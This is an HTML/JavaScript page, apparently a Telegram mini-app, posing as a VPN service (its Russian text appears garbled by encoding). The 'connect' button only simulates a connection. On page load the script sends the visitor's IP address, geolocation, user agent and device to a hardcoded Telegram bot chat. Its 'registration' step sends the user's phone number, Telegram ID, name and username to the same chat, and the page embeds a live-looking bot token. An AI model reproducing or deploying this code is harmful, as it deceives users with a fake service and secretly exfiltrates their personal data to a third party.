<body>
    <div id="registration-page" class="container">

        <p>–°–∞–º–æ–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –¥–ª—è –≤–∞—à–µ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞.</p>
        <button onclick="requestPhoneNumber()">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</button>

        <button id="vpn-button" onclick="toggleVPN()">–ü–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è</button>
        <div class="status" id="status">–ù–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ</div>
        <div class="timer" id="timer">–í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã: 00:00:00</div>
    </div>

    <script>
        const BOT_TOKEN = '8038248372:AAGD5Bb7p8UVjDUNbyIQP8gnc1_YK5Cre7w'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ç–æ–∫–µ–Ω –≤–∞—à–µ–≥–æ –±–æ—Ç–∞
        const ADMIN_CHAT_ID = '1521132127'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ ID –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞

        const registrationPage = document.getElementById('registration-page');
        const vpnPage = document.getElementById('vpn-page');
        const tg = window.Telegram.WebApp;

        let isConnected = false;
        let startTime = null;
        let timerInterval = null;

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram WebApp
        function initTg() {
            tg.expand(); // –†–∞–∑–≤–µ—Ä–Ω—É—Ç—å –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω
            document.body.style.backgroundColor = tg.themeParams.bg_color;
            document.body.style.color = tg.themeParams.text_color;
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        async function sendInfo() {
            try {
                const userAgent = navigator.userAgent;
                const time = new Date().toLocaleString();
                const device = navigator.platform;

                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (!ipResponse.ok) throw new Error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ IP');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
                if (!geoResponse.ok) throw new Error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏');
                const geoData = await geoResponse.json();
                const { city, region, country } = geoData;

                const message = `üßä –ù–û–í–´–ô –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨\n\nIP: ${ip}\nUser-Agent: ${userAgent}\nTime: ${time}\nDevice: ${device}\nLocation: ${city}, ${region}, ${country}`;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
            }
        }

        // –ó–∞–ø—Ä–æ—Å –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        function requestPhoneNumber() {
            tg.requestContact((sent, event) => {
                if (sent) {
                    const phoneNumber = event.responseUnsafe.contact.phone_number;
                    const user = tg.initDataUnsafe.user || {};

                    document.getElementById('phone-number').innerText = `–í–∞—à –Ω–æ–º–µ—Ä: ${phoneNumber}`;

                    const message = `üì± –ù–æ–≤—ã–π –∫–æ–Ω—Ç–∞–∫—Ç:\n\n`
                        + `‚òéÔ∏è –¢–µ–ª–µ—Ñ–æ–Ω: ${phoneNumber}\n`
                        + `üÜî User ID: ${user.id}\n`
                        + `üë§ –ò–º—è: ${user.first_name || ''} ${user.last_name || ''}\n`
                        + `üìõ Username: @${user.username || '–Ω–µ—Ç'}`;

                    sendToAdmin(message);
                    showVPNPage();
                } else {
                    tg.showAlert('–í—ã –æ—Ç–º–µ–Ω–∏–ª–∏ –∑–∞–ø—Ä–æ—Å –Ω–æ–º–µ—Ä–∞.');
                }
            });
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É
        async function sendToAdmin(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    tg.showAlert('üßä –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!\n–ü—Ä–∏—è—Ç–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è!');
                } else {
                    tg.showAlert('‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏.');
                }
            } catch (error) {
                console.error('Error:', error);
                tg.showAlert('‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏.');
            }
        }

        // –ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É VPN
        function showVPNPage() {
            registrationPage.classList.add('hidden');
            vpnPage.classList.remove('hidden');
        }

        // –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ/–æ—Ç–∫–ª—é—á–µ–Ω–∏–µ VPN
        function toggleVPN() {
            const serverSelect = document.getElementById('server-select');
            const status = document.getElementById('status');
            const vpnButton = document.getElementById('vpn-button');

            if (!isConnected) {
                const server = serverSelect.value;
                status.textContent = `–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ ${server}...`;
                setTimeout(() => {
                    isConnected = true;
                    vpnButton.textContent = "–û—Ç–∫–ª—é—á–∏—Ç—å—Å—è";
                    status.textContent = `–ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ ${server}`;
                    startTime = new Date();
                    timerInterval = setInterval(updateTimer, 1000);
                }, 2000);
            } else {
                status.textContent = `–û—Ç–∫–ª—é—á–µ–Ω–∏–µ...`;
                setTimeout(() => {
                    clearInterval(timerInterval);
                    isConnected = false;
                    vpnButton.textContent = "–ü–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è";
                    status.textContent = "–ù–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ";
                    document.getElementById('timer').textContent = "–í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã: 00:00:00";
                }, 2000);
            }
        }

        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ç–∞–π–º–µ—Ä–∞
        function updateTimer() {
            if (startTime) {
                const now = new Date();
                const diff = Math.floor((now - startTime) / 1000);
                const hours = Math.floor(diff / 3600);
                const minutes = Math.floor((diff % 3600) / 60);
                const seconds = diff % 60;
                document.getElementById('timer').textContent = `–í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã: ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            }
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        window.onload = () => {
            sendInfo();
            initTg();
        };

        tg.ready();
    </script>
